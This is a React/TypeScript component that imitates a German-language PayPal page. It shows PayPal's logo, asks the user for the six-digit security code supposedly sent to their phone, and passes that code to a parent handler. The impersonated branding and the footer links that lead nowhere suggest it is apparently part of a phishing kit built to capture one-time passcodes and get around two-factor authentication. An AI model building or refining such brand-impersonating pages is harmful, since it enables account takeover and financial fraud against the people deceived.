import { useState } from 'react';
import '../styles/PayPalStyle.css';

interface CodeEntryFormProps {
  onSubmit: (code: string) => void;
  error?: string;
}

function CodeEntryForm({ onSubmit, error }: CodeEntryFormProps) {
  const [code, setCode] = useState('');

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setCode(e.target.value);
  };

  const handleSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    onSubmit(code);
  };

  return (
    <div className="paypal-container">
      <div className="paypal-form-container">
        <div className="paypal-logo-container">
          <img src="https://www.paypalobjects.com/paypal-ui/logos/svg/paypal-mark-color.svg" alt="PayPal Logo" className="paypal-logo-img" />
        </div>
        
        <form onSubmit={handleSubmit} className="paypal-form">
          <h1 className="paypal-form-title">
            Geben Sie Ihren Sicherheitscode ein
          </h1>
          
          <div className="paypal-form-description">
            Wir haben einen Sicherheitscode an Ihre Handynummer gesendet. Bitte geben Sie den Code ein, um fortzufahren.
          </div>
          
          {error && <div className="paypal-error-alert">
            <span className="error-icon">⚠️</span>
            {error}
          </div>}
          
          <div className="paypal-input-group textInput">
            <div className="fieldWrapper">
              <input
                type="text"
                className="paypal-input"
                id="code"
                placeholder="Sicherheitscode"
                name="code"
                value={code}
                onChange={handleChange}
                required
                autoComplete="off"
                maxLength={6}
                pattern="[0-9]*"
                inputMode="numeric"
              />
              {code && <label htmlFor="code" className="paypal-input-label">Sicherheitscode</label>}
            </div>
          </div>
          
          <div className="paypal-button-container">
            <button type="submit" className="paypal-button-primary" disabled={!code}>
              Bestätigen
            </button>
          </div>
          
          <div className="paypal-form-links">
            <a href="#" className="paypal-link">Code nicht erhalten?</a>
          </div>
        </form>
      </div>
      
      <div className="paypal-footer">
        <a href="#">Kontakt</a>
        <a href="#">Datenschutz</a>
        <a href="#">AGB</a>
        <a href="#">Impressum</a>
        <a href="#">Weltweit</a>
      </div>
    </div>
  );
}

export default CodeEntryForm;
